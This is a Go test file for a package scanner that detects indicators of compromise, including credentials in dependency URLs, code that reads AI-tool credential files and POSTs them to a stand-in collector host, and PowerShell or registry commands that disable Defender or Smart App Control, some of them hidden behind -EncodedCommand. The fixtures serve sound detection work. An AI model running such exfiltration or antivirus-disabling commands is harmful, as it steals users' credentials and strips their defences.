package iocscan

import (
	"encoding/base64"
	"encoding/binary"
	"strings"
	"testing"
	"unicode/utf16"
)

// encPS is PowerShell's -EncodedCommand encoding: base64 of UTF-16LE.
func encPS(cmd string) string {
	u := utf16.Encode([]rune(cmd))
	b := make([]byte, 2*len(u))
	for i, c := range u {
		binary.LittleEndian.PutUint16(b[2*i:], c)
	}
	return base64.StdEncoding.EncodeToString(b)
}

func TestDependencyCredential(t *testing.T) {
	tok := "ghp_" + strings.Repeat("a1B2", 9) // 40 chars, fake
	cases := []struct {
		name string
		file string
		body string
		want string
	}{
		{"token in a git dependency", "package/package.json",
			`{"dependencies":{"sysframe":"git+https://` + tok + `@github.com/x/y.git"}}`, "package/package.json: ghp_…(40 chars)"},
		{"token outside the dependency maps", "package/package.json",
			`{"description":"see ` + tok + `","dependencies":{"a":"^1.0.0"}}`, ""},
		{"plain git dependency", "package/package.json",
			`{"dependencies":{"a":"git+https://github.com/x/y.git#v1"}}`, ""},
		{"user:password in requirements", "x-1.0/requirements.txt",
			"pkg @ git+https://bob:hunter2@git.example.com/pkg.git\n", "x-1.0/requirements.txt: user:password@ in a URL"},
		{"token in source code is not a dependency", "package/index.js",
			`const t = "` + tok + `"`, ""},
		{"token in a lockfile resolved URL", "package/package-lock.json",
			`{"packages":{"node_modules/a":{"resolved":"https://` + tok + `@codeload.github.com/x/a/tar.gz/1"}}}`, "package/package-lock.json: ghp_…(40 chars)"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := DependencyCredential(map[string][]byte{tc.file: []byte(tc.body)})
			if got != tc.want {
				t.Fatalf("got %q, want %q", got, tc.want)
			}
			if strings.Contains(got, tok) {
				t.Fatal("the raw token leaked into the detail")
			}
		})
	}
}

func TestAppCredentialSend(t *testing.T) {
	send := "\nfetch('https://collector.example/api', {method:'POST', body: data})\n"
	cases := []struct {
		name string
		file string
		body string
		want bool
	}{
		{"codex auth read and posted", "package/bin/lib/aikey.mjs", "const p = home + '/.codex/auth.json'" + send, true},
		{"lark keychain read and posted", "package/dist/worker.js", "readFile(dir + '/lark-cli/app.enc')" + send, true},
		{"read without a send", "package/dist/usage.js", "glob(home + '/.claude/projects/*.jsonl')", false},
		{"generic path is not on the list", "package/dist/x.js", "readFile(home + '/.npmrc')" + send, false},
		{"test fixture", "package/test/fixture.js", "'/.codex/auth.json'" + send, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := AppCredentialSend(map[string][]byte{tc.file: []byte(tc.body)})
			if (got != "") != tc.want {
				t.Fatalf("got %q, want hit=%v", got, tc.want)
			}
		})
	}
}

// @apexacc/audit (2026-09) turned off Defender and Smart App Control through
// PowerShell from its install path.
func TestDefenderTamper(t *testing.T) {
	cases := []struct {
		name string
		file string
		body string
		want string
	}{
		{"realtime monitoring off", "package/scripts/setup.js",
			"execSync('powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"')",
			"Set-MpPreference -DisableRealtimeMonitoring (package/scripts/setup.js)"},
		{"exclusion path, any case", "pkg/install.py",
			"subprocess.run(['powershell', 'add-mppreference -ExclusionPath C:\\\\Users'])",
			"add-mppreference -ExclusionPath (pkg/install.py)"},
		{"reading preferences is not tampering", "package/a.js", "exec('Get-MpPreference')", ""},
		{"enabling is not tampering", "package/a.js", "exec('Set-MpPreference -SignatureUpdateInterval 4')", ""},
		{"docs", "package/docs/windows.md", "Set-MpPreference -DisableRealtimeMonitoring $true", ""},
		{"smart app control off", "package/apex.cjs",
			"execSync(`powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy' -Name VerifiedAndReputablePolicyState -Value 0\"`)",
			"Smart App Control policy write (VerifiedAndReputablePolicyState) (package/apex.cjs)"},
		{"smart app control via reg add", "package/a.js",
			"exec('reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f')",
			"Smart App Control policy write (VerifiedAndReputablePolicyState) (package/a.js)"},
		{"reading smart app control state", "package/a.js",
			"exec('Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy -Name VerifiedAndReputablePolicyState')", ""},
		{"encoded exclusion", "package/apex.cjs",
			"spawn('powershell',['-WindowStyle','Hidden','-Command',\"Start-Process powershell -Verb RunAs -ArgumentList '-EncodedCommand " + encPS("Add-MpPreference -ExclusionPath C:\\x") + "'\"])",
			"Add-MpPreference -ExclusionPath (package/apex.cjs, -EncodedCommand)"},
		{"encoded, -enc and array arg", "package/a.js",
			"spawn('powershell',['-enc','" + encPS("Set-MpPreference -DisableRealtimeMonitoring $true") + "'])",
			"Set-MpPreference -DisableRealtimeMonitoring (package/a.js, -EncodedCommand)"},
		{"encoded benign command", "package/a.js",
			"exec('powershell -e " + encPS("Get-ChildItem Env:") + "')", ""},
		{"not utf-16 base64", "package/a.js",
			"exec('node -e " + base64.StdEncoding.EncodeToString([]byte("Add-MpPreference -ExclusionPath C:\\x")) + "')", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := DefenderTamper(map[string][]byte{tc.file: []byte(tc.body)}); got != tc.want {
				t.Fatalf("got %q, want %q", got, tc.want)
			}
		})
	}
}
